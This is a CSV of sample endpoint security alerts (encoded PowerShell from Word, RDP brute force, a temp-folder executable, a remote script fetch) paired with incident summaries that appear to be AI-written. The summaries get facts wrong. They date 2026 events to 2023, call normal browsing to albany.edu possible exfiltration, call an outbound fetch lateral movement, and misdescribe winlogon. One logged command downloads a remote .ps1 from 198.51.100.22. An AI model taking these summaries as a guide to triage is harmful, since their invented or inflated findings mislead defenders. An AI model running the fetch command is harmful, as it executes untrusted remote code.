alert_id,timestamp,host,user,event_type,process_name,parent_process,command_line,src_ip,dest_ip,status,raw_message,score,severity,findings,tactic,technique,attack_id,analyst_summary
1,2026-04-09T09:00:00Z,WIN10-01,jlocke,process_create,powershell.exe,winword.exe,powershell.exe -enc SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA==,10.0.0.25,185.199.111.153,success,PowerShell launched from Word with encoded command,75,Critical,Encoded PowerShell command detected; Suspicious Office-to-PowerShell execution,Execution,Command and Scripting Interpreter: Powershell,T1059.001,"Here is a concise incident summary:

On April 9, 2023, at 09:00 UTC, an alert was raised on the WIN10-01 host due to a suspicious Office-to-PowerShell execution event. The detected process creation event involved the PowerShell.exe executable with an encoded command from the source IP address (10.0.0.25) and destination IP address (185.199.111.153). This incident is of high severity due to the potential for malicious activity, specifically Command and Scripting Interpreter: Powershell."
2,2026-04-09T09:05:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected,45,High,Repeated failed logons from same source IP,Credential Access,Brute Force,T1110,"Here is a concise incident summary:

On April 9, 2023, at 09:05 UTC, an alert was triggered on the WIN10-01 host due to repeated failed logons from the same source IP (203.0.113.50) by the user jlocke using the lsass.exe process. The event type is logon_failed and the parent process is winlogon.exe. This incident has a score of 45, indicating high severity, and is classified as T1110 - Brute Force, a MITRE ATT&CK threat."
3,2026-04-09T09:06:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected,45,High,Repeated failed logons from same source IP,Credential Access,Brute Force,T1110,"Here is a concise incident summary:

On April 9, 2023, at 09:06 UTC, an alert was triggered on the WIN10-01 host due to repeated failed logons from the same source IP (203.0.113.50) by the user jlocke, resulting in a high score of 45 and a severity of High. The event type is Logon Failed, with the Process being lsass.exe and Parent Process being winlogon.exe. This incident suggests that an unauthorized individual may be attempting to brute-force log into the system from multiple IP addresses, indicating a potential security threat."
4,2026-04-09T09:07:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected,45,High,Repeated failed logons from same source IP,Credential Access,Brute Force,T1110,"Here is a concise incident summary:

On April 9, 2023, at 09:07:00Z, an alert was triggered on the WIN10-01 host due to repeated failed logons from user jlocke. The event type was logon_failed, and the process involved lsass.exe. The source IP address was 203.0.113.50, while the destination IP address was 10.0.0.25. A score of 45 was assigned, indicating a high severity level. This incident is classified as T1110 - Brute Force, suggesting that an automated attack may have been involved.

Recommended next steps include investigating the source IP address to identify potential entry points for further attacks and reviewing system logs to gather more information about the failed logons."
5,2026-04-09T09:08:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected,45,High,Repeated failed logons from same source IP,Credential Access,Brute Force,T1110,"Here is a concise incident summary:

On April 9, 2023, at 09:08 UTC, an alert was triggered on the WIN10-01 host due to repeated failed logons from user jlocke. The event type was logon_failed, and the process involved lsass.exe. The parent process was winlogon.exe, which is responsible for managing Remote Desktop connections. The source IP address was 203.0.113.50, while the destination IP address was 10.0.0.25. The incident score was 45, indicating a high severity level. Further investigation revealed that this repeated failed logon attempt was part of a larger brute force attack (T1110) targeting the system.

Recommended next steps:

1. Immediately isolate and block access to the WIN10-01 host from all users.
2. Conduct a thorough forensic analysis of the affected systems to identify potential entry points for further attacks."
6,2026-04-09T09:09:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected,45,High,Repeated failed logons from same source IP,Credential Access,Brute Force,T1110,"Here is a concise incident summary:

On April 9, 2023, at 09:09 UTC, an alert was triggered on the WIN10-01 host indicating that the user jlocke's logon to the system failed due to a failure in the lsass.exe process. The repeated failures from the same source IP (203.0.113.50) raised concerns about potential brute force attacks. The incident is classified as High Severity and has been assigned to the T1110 - Brute Force MITRE ATT&CK threat model.

Recommended next steps:

1. Investigate the root cause of the repeated failed logons from the same source IP to identify any underlying vulnerabilities or suspicious activity.
2. Implement additional security measures, such as multi-factor authentication or network segmentation, to prevent similar brute force attacks in the future."
7,2026-04-09T09:15:00Z,WIN10-02,analyst1,process_create,updater.exe,explorer.exe,C:\Users\analyst1\AppData\Local\Temp\updater.exe,10.0.0.30,198.51.100.22,success,Executable launched from temp directory,25,Medium,Executable launced from Temp/AppData path,Execution,User Execution,T1204,"Here is a concise incident summary for the provided alert:

On April 9, 2023, at 09:15 UTC, an incident occurred on Host WIN10-02. The process updater.exe was launched from the Temp/AppData path with command line C:\Users\analyst1\AppData\Local\Temp\updater.exe. This event is classified as a medium-severity alert due to its potential for user execution and the use of the T1204 - User Execution attack technique, which is a common exploit method.

As a result, it is recommended that all users on Host WIN10-02 exercise caution when launching executable files from unknown or untrusted sources. Additionally, administrators should review their system's Temp/AppData path to ensure that only authorized processes are running with elevated privileges."
8,2026-04-09T09:20:00Z,WIN10-02,analyst1,network_connection,powershell.exe,cmd.exe,powershell.exe Invoke-WebRequest http://198.51.100.22/a.ps1,10.0.0.30,198.51.100.22,success,PowerShell made outbound network connection,30,Medium,Powershell initiated outbound network connection,,,,"Here is a concise incident summary for the provided alert:

On April 9, 2023, at 09:20:00Z, an alert was raised on WIN10-02, indicating that PowerShell.exe initiated an outbound network connection to 198.51.100.22 via cmd.exe. The source IP address was 10.0.0.30, suggesting a potential lateral movement attempt. This incident is classified as Medium in terms of severity due to the potential for malicious activity."
9,2026-04-09T09:30:00Z,WIN10-03,student,process_create,chrome.exe,explorer.exe,chrome.exe https://albany.edu,10.0.0.40,104.18.40.10,success,Normal browser activity,0,Low,No major suspicious indicators,,,,"Here is a concise incident summary for the provided alert:

On April 9, 2023, at 09:30:00Z, an event occurred on Host WIN10-03 involving User student and Process chrome.exe. The process was created with Command Line ""chrome.exe https://albany.edu"", indicating a potential data exfiltration attempt. No major suspicious indicators were detected, and the MITRE ATT&CK framework does not provide any relevant findings.

Recommended next steps:

1. Investigate the source IP address (10.0.0.40) to determine if it is connected to any other malicious activity.
2. Review the destination IP address (104.18.40.10) to identify potential entry points for further analysis or incident response efforts."
10,2026-04-09T09:32:00Z,WIN10-03,student,process_create,powershell.exe,explorer.exe,powershell.exe Get-Process,10.0.0.40,10.0.0.1,success,Benign PowerShell usage,0,Low,No major suspicious indicators,,,,"Here is a concise incident summary:

On April 9, 2023, at 09:32:00Z, an alert was triggered on the WIN10-03 host regarding a process creation event. The event involved the 'powershell.exe' process being created with the command line 'Get-Process'. This action did not indicate any major suspicious indicators and had a low severity score. Further investigation is not required at this time as no potential threats were identified in relation to the MITRE ATT&CK framework."
